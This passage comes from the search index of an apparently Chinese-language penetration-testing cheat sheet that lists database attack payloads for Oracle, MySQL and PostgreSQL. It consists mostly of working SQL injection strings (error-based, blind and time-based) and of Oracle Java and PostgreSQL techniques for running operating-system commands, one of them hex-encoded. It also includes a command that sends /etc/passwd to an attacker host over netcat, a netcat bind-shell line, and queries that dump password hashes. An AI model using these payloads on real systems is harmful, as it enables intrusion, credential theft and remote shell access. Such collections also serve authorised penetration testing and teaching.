rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users SQL Error SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) XDBURITYPE getblob XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob() XDBURITYPE getclob XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob() When the injection point is inside a string use : '||PAYLOAD--","title":"Oracle SQL \u62a5\u9519\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_10","text":"Description Query Version is 12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; Subselect is enabled SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) Table log_table exists SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); Column message exists in table log_table SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; First letter of first message is t SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';","title":"Oracle SQL \u76f2\u6ce8"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_11","text":"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])","title":"Oracle SQL \u65f6\u95f4\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-sql_12","text":"ODAT (Oracle Database Attacking Tool)","title":"Oracle SQL \u547d\u4ee4\u6267\u884c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-java-execution","text":"List Java privileges sql select * from dba_java_policy select * from user_java_policy Grant privileges sql exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute'); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', ''); exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', ''); Execute commands 10g R2, 11g R1 and R2: DBMS_JAVA_TEST.FUNCALL() sql SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual 11g R1 and R2: DBMS_JAVA.RUNJAVA() sql SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL","title":"Oracle Java Execution"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#oracle-java-class","text":"/* create Java class */ BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END; / BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END; / /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual; or (hex encoded) /* create Java class */ SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d'')); EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual /* run OS command */ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;","title":"Oracle Java Class"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/Oracle/#references","text":"NetSpi - SQL Wiki ASDC12 - New and Improved Hacking Oracle From Web - OWASP Pentesting Oracle TNS Listener - HackTricks ODAT: Oracle Database Attacking Tool - quentinhardy WebSec CheatSheet - Oracle New payload to exploit Error-based SQL injection - Oracle database - Mannu Linux - 12/09/2023 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md","title":"References"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/","text":"mysql mysql \u67e5\u8fde\u63a5 IP SELECT * FROM performance_schema.hosts; show full processlist; mysql \u67e5\u6700\u5927\u6570\u91cf\u8868 select table_name,table_rows,table_schema,table_comment from information_schema.tables order by table_rows desc; \u67e5\u8be2 user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868 SELECT TABLE_SCHEMA AS database_name, TABLE_NAME AS table_name, COLUMN_NAME AS column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%user%'; \u7edf\u8ba1\u8bbf\u95ee\u8fc7\u7684\u8868\u6b21\u6570 //\u5e93\u540d,\u8868\u540d,\u8bbf\u95ee\u6b21\u6570 select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc; \u67e5\u770b\u5199\u5165\u6743\u9650 mysql> show global variables like '%secure%'; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_auth | ON | | secure_file_priv | | \u53ef\u5199\u5165 | secure_file_priv | NULL | \u4e0d\u53ef\u5199\u5165 +------------------+-------+ SHOW VARIABLES LIKE \"secure_file_priv\"; NULL\uff0c\u8868\u793a\u7981\u6b62\u3002 \u5982\u679cvalue\u503c\u6709\u6587\u4ef6\u5939\u76ee\u5f55\uff0c\u5219\u8868\u793a\u53ea\u5141\u8bb8\u8be5\u76ee\u5f55\u4e0b\u6587\u4ef6\uff0c\u6d4b\u8bd5\u5b50\u76ee\u5f55\u4e5f\u4e0d\u884c\u3002 \u5982\u679c\u4e3a\u7a7a\uff0c\u5219\u8868\u793a\u4e0d\u9650\u5236\u76ee\u5f55\u3002 \u4e0d\u767b\u5f55\u6267\u884c sql mysql -uaHmin -proot test -e \"select now()\" -N >H:/work/target1.txt mysql -uroot -e \"show databases;\" >1.txt \u57fa\u7840\u547d\u4ee4 \u663e\u793a\u7248\u672c: select version(); \u663e\u793a\u5b57\u7b26\u96c6: select @@character_set_database; \u663e\u793a\u6570\u636e\u5e93: show databases; \u663e\u793a\u8868\u540d: show tables; \u663e\u793a\u5b57\u6bb5: show columns from table_name; \u663e\u793a\u8ba1\u7b97\u673a\u540d: select @@hostname; \u7cfb\u7edf\u7248\u672c: select @@version_compile_os; mysql\u8def\u5f84: select @@basedir; \u6570\u636e\u5e93\u8def\u5f84: select @@datadir; describe describe table_name; \u663e\u793aroot\u5bc6\u7801: select User,Password from mysql.user; \u5bfc\u5165\u6587\u4ef6: select load_fie(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C); \u5bfc\u51fa\u6587\u4ef6: select 'testtest' into outfile '/var/www/html/test.txt' from mysql.user; \u5f00\u542f\u5916\u8fde: GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; mysql\u5b89\u88c5\u8def\u5f84: show variables; \u66f4\u65b0\u6570\u636e\u5e93: UPDATE `DX15`.`dx15_common_member` SET `uid` = '1' WHERE `dx15_common_member`.`uid` =40407;\u66f4\u65b040407uid\u53d8\u6210uid1 mysql\u66f4\u6539root\u5bc6\u7801: mysqladmin -u root password \"newpwd\"; \u67e5\u8be2\u8868: select concat(User,0x3a,Password) from mysql.user; \u83b7\u53d6\u6570\u636e\u5e93\u6240\u6709\u8868: SHOW TABLES FROM `databases`; \u83b7\u53d6\u5217\u524d20\u884c: SELECT * FROM `admin_bbs` ORDER BY 1 DESC LIMIT 0,20; \u83b7\u53d6\u8868\u884c\u6570: SELECT COUNT(*) AS CNT FROM `dede_admin`;","title":"mysql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#mysql","text":"","title":"mysql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#mysql-ip","text":"SELECT * FROM performance_schema.hosts; show full processlist;","title":"mysql \u67e5\u8fde\u63a5 IP"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#mysql_1","text":"select table_name,table_rows,table_schema,table_comment from information_schema.tables order by table_rows desc;","title":"mysql \u67e5\u6700\u5927\u6570\u91cf\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#user","text":"SELECT TABLE_SCHEMA AS database_name, TABLE_NAME AS table_name, COLUMN_NAME AS column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%user%';","title":"\u67e5\u8be2 user \u5b57\u6bb5\u5728\u54ea\u4e2a\u5e93\u54ea\u4e2a\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#_1","text":"//\u5e93\u540d,\u8868\u540d,\u8bbf\u95ee\u6b21\u6570 select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;","title":"\u7edf\u8ba1\u8bbf\u95ee\u8fc7\u7684\u8868\u6b21\u6570"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#_2","text":"mysql> show global variables like '%secure%'; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_auth | ON | | secure_file_priv | | \u53ef\u5199\u5165 | secure_file_priv | NULL | \u4e0d\u53ef\u5199\u5165 +------------------+-------+ SHOW VARIABLES LIKE \"secure_file_priv\"; NULL\uff0c\u8868\u793a\u7981\u6b62\u3002 \u5982\u679cvalue\u503c\u6709\u6587\u4ef6\u5939\u76ee\u5f55\uff0c\u5219\u8868\u793a\u53ea\u5141\u8bb8\u8be5\u76ee\u5f55\u4e0b\u6587\u4ef6\uff0c\u6d4b\u8bd5\u5b50\u76ee\u5f55\u4e5f\u4e0d\u884c\u3002 \u5982\u679c\u4e3a\u7a7a\uff0c\u5219\u8868\u793a\u4e0d\u9650\u5236\u76ee\u5f55\u3002","title":"\u67e5\u770b\u5199\u5165\u6743\u9650"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#sql","text":"mysql -uaHmin -proot test -e \"select now()\" -N >H:/work/target1.txt mysql -uroot -e \"show databases;\" >1.txt","title":"\u4e0d\u767b\u5f55\u6267\u884c sql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mysql/#_3","text":"\u663e\u793a\u7248\u672c: select version(); \u663e\u793a\u5b57\u7b26\u96c6: select @@character_set_database; \u663e\u793a\u6570\u636e\u5e93: show databases; \u663e\u793a\u8868\u540d: show tables; \u663e\u793a\u5b57\u6bb5: show columns from table_name; \u663e\u793a\u8ba1\u7b97\u673a\u540d: select @@hostname; \u7cfb\u7edf\u7248\u672c: select @@version_compile_os; mysql\u8def\u5f84: select @@basedir; \u6570\u636e\u5e93\u8def\u5f84: select @@datadir; describe describe table_name; \u663e\u793aroot\u5bc6\u7801: select User,Password from mysql.user; \u5bfc\u5165\u6587\u4ef6: select load_fie(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C); \u5bfc\u51fa\u6587\u4ef6: select 'testtest' into outfile '/var/www/html/test.txt' from mysql.user; \u5f00\u542f\u5916\u8fde: GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; mysql\u5b89\u88c5\u8def\u5f84: show variables; \u66f4\u65b0\u6570\u636e\u5e93: UPDATE `DX15`.`dx15_common_member` SET `uid` = '1' WHERE `dx15_common_member`.`uid` =40407;\u66f4\u65b040407uid\u53d8\u6210uid1 mysql\u66f4\u6539root\u5bc6\u7801: mysqladmin -u root password \"newpwd\"; \u67e5\u8be2\u8868: select concat(User,0x3a,Password) from mysql.user; \u83b7\u53d6\u6570\u636e\u5e93\u6240\u6709\u8868: SHOW TABLES FROM `databases`; \u83b7\u53d6\u5217\u524d20\u884c: SELECT * FROM `admin_bbs` ORDER BY 1 DESC LIMIT 0,20; \u83b7\u53d6\u8868\u884c\u6570: SELECT COUNT(*) AS CNT FROM `dede_admin`;","title":"\u57fa\u7840\u547d\u4ee4"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/","text":"postgresql PostgreSQL \u547d\u4ee4\u6267\u884c CVE-2019\u20139193 DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; \u4f7f\u7528 libc.so.6 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>'); PostgreSQL \u6ce8\u91ca -- /**/ PostgreSQL \u94fe\u6ce8\u5165\u70b9\u7b26\u53f7 ; #\u7528\u4e8e\u7ec8\u6b62 SQL \u547d\u4ee4\u3002\u5728\u8bed\u53e5\u4e2d\u552f\u4e00\u53ef\u4f7f\u7528\u7684\u4f4d\u7f6e\u662f\u5728\u5b57\u7b26\u4e32\u5e38\u91cf\u6216\u5f15\u7528\u6807\u8bc6\u7b26\u4e2d\u3002 || #\u6216\u8bed\u53e5 # \u4f7f\u7528\u793a\u4f8b: /?whatever=1;(select 1 from pg_sleep(5)) /?whatever=1||(select 1 from pg_sleep(5)) PostgreSQL \u7248\u672c SELECT version() PostgreSQL \u5f53\u524d\u7528\u6237 SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername(); PostgreSQL \u7528\u6237\u5217\u8868 SELECT usename FROM pg_user PostgreSQL \u5bc6\u7801\u54c8\u5e0c\u5217\u8868 SELECT usename, passwd FROM pg_shadow \u67e5\u8be2\u6570\u636e\u5e93\u7ba1\u7406\u5458\u8d26\u6237\u5217\u8868 SELECT usename FROM pg_user WHERE usesuper IS TRUE PostgreSQL \u6743\u9650\u5217\u8868 SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user \u67e5\u8be2\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237 SHOW is_superuser; SELECT current_setting('is_superuser'); SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER; PostgreSQL \u6570\u636e\u5e93\u540d\u79f0 SELECT current_database() PostgreSQL \u6570\u636e\u5e93\u5217\u8868 SELECT datname FROM pg_database PostgreSQL \u8868\u683c\u5217\u8868 SELECT table_name FROM information_schema.tables PostgreSQL \u5217\u8868\u5217 SELECT column_name FROM information_schema.columns WHERE table_name='data_table' PostgreSQL \u62a5\u9519\u6ce8\u5165 ,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC) ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC) ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1 PostgreSQL XML \u5e2e\u52a9\u5668 select query_to_xml('select * from pg_user',true,true,''); -- \u8fd4\u56de\u6240\u6709\u7ed3\u679c\u4f5c\u4e3a\u5355\u4e2a xml \u884c select database_to_xml(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML select database_to_xmlschema(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML \u67b6\u6784 PostgreSQL \u76f2\u6ce8 ' and substr(version(),1,10) = 'PostgreSQL' and '1' -> OK ' and substr(version(),1,10) = 'PostgreXXX' and '1' -> KO PostgreSQL \u65f6\u95f4\u76f2\u6ce8 select 1 from pg_sleep(5) ;(select 1 from pg_sleep(5)) ||(select 1 from pg_sleep(5)) select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1 select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) PostgreSQL \u5806\u53e0\u67e5\u8be2 http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));-- PostgreSQL \u6587\u4ef6\u8bfb\u53d6 select pg_ls_dir('./'); select pg_read_file('PG_VERSION', 0, 200); PostgreSQL \u6587\u4ef6\u5199\u5165 CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash'); SELECT * FROM pentestlab; COPY pentestlab(t) TO '/tmp/pentestlab'; \u7ed5\u8fc7\u8fc7\u6ee4\u5668 \u5f15\u53f7 \u4f7f\u7528 CHR SELECT CHR(65)||CHR(66)||CHR(67); \u4f7f\u7528 $ \u7b26\u53f7\uff08\u9002\u7528\u4e8e PostgreSQL 8\u53ca\u4ee5\u4e0a\u7248\u672c\uff09 SELECT $$This is a string$$ SELECT $TAG$This is another string$TAG$","title":"postgresql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql","text":"","title":"postgresql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_1","text":"","title":"PostgreSQL \u547d\u4ee4\u6267\u884c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#cve-20199193","text":"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;","title":"CVE-2019\u20139193"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#libcso6","text":"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');","title":"\u4f7f\u7528 libc.so.6"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_2","text":"-- /**/","title":"PostgreSQL \u6ce8\u91ca"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_3","text":"; #\u7528\u4e8e\u7ec8\u6b62 SQL \u547d\u4ee4\u3002\u5728\u8bed\u53e5\u4e2d\u552f\u4e00\u53ef\u4f7f\u7528\u7684\u4f4d\u7f6e\u662f\u5728\u5b57\u7b26\u4e32\u5e38\u91cf\u6216\u5f15\u7528\u6807\u8bc6\u7b26\u4e2d\u3002 || #\u6216\u8bed\u53e5 # \u4f7f\u7528\u793a\u4f8b: /?whatever=1;(select 1 from pg_sleep(5)) /?whatever=1||(select 1 from pg_sleep(5))","title":"PostgreSQL \u94fe\u6ce8\u5165\u70b9\u7b26\u53f7"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_4","text":"SELECT version()","title":"PostgreSQL \u7248\u672c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_5","text":"SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername();","title":"PostgreSQL \u5f53\u524d\u7528\u6237"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_6","text":"SELECT usename FROM pg_user","title":"PostgreSQL \u7528\u6237\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_7","text":"SELECT usename, passwd FROM pg_shadow","title":"PostgreSQL \u5bc6\u7801\u54c8\u5e0c\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#_1","text":"SELECT usename FROM pg_user WHERE usesuper IS TRUE","title":"\u67e5\u8be2\u6570\u636e\u5e93\u7ba1\u7406\u5458\u8d26\u6237\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_8","text":"SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user","title":"PostgreSQL \u6743\u9650\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#_2","text":"SHOW is_superuser; SELECT current_setting('is_superuser'); SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;","title":"\u67e5\u8be2\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_9","text":"SELECT current_database()","title":"PostgreSQL \u6570\u636e\u5e93\u540d\u79f0"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_10","text":"SELECT datname FROM pg_database","title":"PostgreSQL \u6570\u636e\u5e93\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_11","text":"SELECT table_name FROM information_schema.tables","title":"PostgreSQL \u8868\u683c\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_12","text":"SELECT column_name FROM information_schema.columns WHERE table_name='data_table'","title":"PostgreSQL \u5217\u8868\u5217"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_13","text":",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC) ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC) ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1","title":"PostgreSQL \u62a5\u9519\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql-xml","text":"select query_to_xml('select * from pg_user',true,true,''); -- \u8fd4\u56de\u6240\u6709\u7ed3\u679c\u4f5c\u4e3a\u5355\u4e2a xml \u884c select database_to_xml(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML select database_to_xmlschema(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML \u67b6\u6784","title":"PostgreSQL XML \u5e2e\u52a9\u5668"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_14","text":"' and substr(version(),1,10) = 'PostgreSQL' and '1' -> OK ' and substr(version(),1,10) = 'PostgreXXX' and '1' -> KO","title":"PostgreSQL \u76f2\u6ce8"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_15","text":"select 1 from pg_sleep(5) ;(select 1 from pg_sleep(5)) ||(select 1 from pg_sleep(5)) select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1 select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))","title":"PostgreSQL \u65f6\u95f4\u76f2\u6ce8"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_16","text":"http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--","title":"PostgreSQL \u5806\u53e0\u67e5\u8be2"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_17","text":"select pg_ls_dir('./'); select pg_read_file('PG_VERSION', 0, 200);","title":"PostgreSQL \u6587\u4ef6\u8bfb\u53d6"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_18","text":"CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash'); SELECT * FROM pentestlab; COPY pentestlab(t) TO '/tmp/pentestlab';","title":"PostgreSQL 